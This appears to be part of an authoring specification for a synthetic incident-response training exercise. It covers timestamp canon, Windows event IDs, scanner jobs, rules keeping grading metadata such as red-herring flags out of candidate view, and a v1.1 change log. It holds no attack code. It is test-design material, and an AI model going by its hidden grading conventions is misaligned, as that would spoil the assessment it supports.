- All timestamps IST except §1 IIS (UTC + canonical header line); every IST timestamp matches ATTACK_TIMELINE.md exactly (11:47, 13:02, 09:58, 11:15, 11:30, 13:10, 10:15, 12:30–13:05, 15:20, 09:47, 10:30, 17:30).
- Event-ID canon: the invalid v1.0 "TGT granted" event ID is retired and must never be used; initial-access validation is DC-01 **4776** (NTLM credential validation) paired with the WEB-PRD-01 4624 Type 10 success at 11:47:03 (§2).
- Scanner canon: on-demand authenticated scan = 2026-09-04 09:15 IST (job VS-MAN-2026-0904, operator devang.shah); recurring weekly scan = **2026-09-08 02:00 IST** (Tuesday, job VS-WK37-2026).
- Rule-out fields (and all classification fields: `red_herring`, `rh_refs`, `rule_out`, `corroborates`, `expected_significance`) live ONLY in `internal_metadata` per EVIDENCE_DIRECTORY_SPEC v1.1 §4–5; candidate-visible content carries only diegetic pointers (e.g., TRV-2026-0312, quarantine-note reference). See §15.
- Every hash field is prefixed `SYNTHETIC-`; every file header carries `# SYNTHETIC TRAINING DATA` (IIS artifacts carry the canonical UTC-conversion header line instead/additionally).
- No template exceeds ~200 lines; high-volume sources use the `# SUMMARY` + drill-down convention (§1, §5, §10).
- Negative records (e.g., E-PROXY-001) are rendered explicitly ("no matching entries"), never as empty files.

---

## 15. Candidate View vs Internal Metadata (rendering rule for all templates)

Per EVIDENCE_DIRECTORY_SPEC v1.1 §4–5, every artifact's metadata is split into two blocks:

- **`candidate_view`** (rendered to candidates): evidence_id, path, type, source, host, timezone, window_ist, reveal_phase, synthetic, drilldown pointer — plus the artifact body itself.
- **`internal_metadata`** (authoring/grading only, shipped in a separate grading manifest, NEVER rendered): evt_refs, rh_refs, red_herring, rule_out, corroborates, relevance, expected_significance.

The browser UI renders ONLY `candidate_view` + artifact body. Consequently, candidate-visible artifact bodies (all exemplars in §1–§13) must never contain the strings **"decisive"**, **"corroborating"**, **"expected significance"**, **"correct answer"**, **"attack event ID"**, **"red herring"**, or **"rule-out"** (in any casing). Diegetic in-world pointers are allowed: e.g. "registered static IP — see asset inventory", "HR travel approval TRV-2026-0312 on file (E-DOC-003)", "orders placed match dealer POs", "quarantined per IR-2025-011 note". Classification prose in this document is authoring guidance only and never ships inside an artifact body.

---

## 16. v1.1 Change Log

Version: 1.1 — Agent 3.5 consistency pass (2026-09-11). Changes applied per V1_1_CHANGE_SPEC.md:

- **CHG-01:** §9 schema `schedule` field split into `job_type*` ("scheduled"|"on_demand") + `schedule_note`; §9 exemplar rewritten as on-demand job VS-MAN-2026-0904 (2026-09-04 09:15–11:02 IST, cred svc_monitor, operator devang.shah) with "next scheduled run 2026-09-08 02:00 IST (job VS-WK37-2026)"; E-VULN-002 recurring instance fixed to Tuesday 2026-09-08 02:00 IST.
- **CHG-02:** NetFlow 7-day-retention summary artifact is now **E-NET-006** (`net/E-NET-006_netflow_summary_7day_retention.log`); §5 exemplar header comment now points to E-NET-006 (retention artifact renumbered); §5 heading extended to E-NET-001…006.
- **CHG-03:** Orphan artifacts registered: E-EDR-008B noted as first-class registered artifact `edr/E-EDR-008B_app-prd-01_beacon_scriptblock.log` (§4); new exemplars/subsections added for E-EDR-015 (`edr_session`, §3d), E-PROXY-001 (`proxy_log`, explicit negative record, §5c), E-DOC-003 (HR travel approval TRV-2026-0312, §11e); E-AUTH-012 noted in §8; E-SHARE-001 registered path `fs/` noted in §10.
- **CHG-04:** §2(a) event_id enum now `(4624|4625|4662|4720|4725|4726|4728|4732|4776)`; §2(b) exemplar's former invalid "TGT granted" line replaced with the DC-01 4776 NTLM validation SUCCESS line (11:47:01); 4624 Type 10 success kept at 11:47:03. The retired event ID appears nowhere.
- **CHG-05:** §8 VPN exemplar authoring header comment removed; diegetic notes kept; "manifest sidecars" sentence replaced with the internal_metadata-only rule; `red_herring`/`rule_out` removed from §8/§9 candidate-visible schemas and `rh_refs` from §11(a); new §15 codifies candidate_view / internal_metadata separation and the forbidden-string list.
- **CHG-10:** §1 exemplar header now uses the exact canonical line `# Synthetic training data. IIS timestamps are UTC. Convert to IST by adding +05:30.`; front-matter timezone note made consistent.
- **§14 checklist:** updated (rule-out fields only in internal_metadata; retired event ID eliminated; DC-01 4776 for initial-access validation; recurring scan 2026-09-08 02:00 IST; timestamp list unchanged — all still valid).
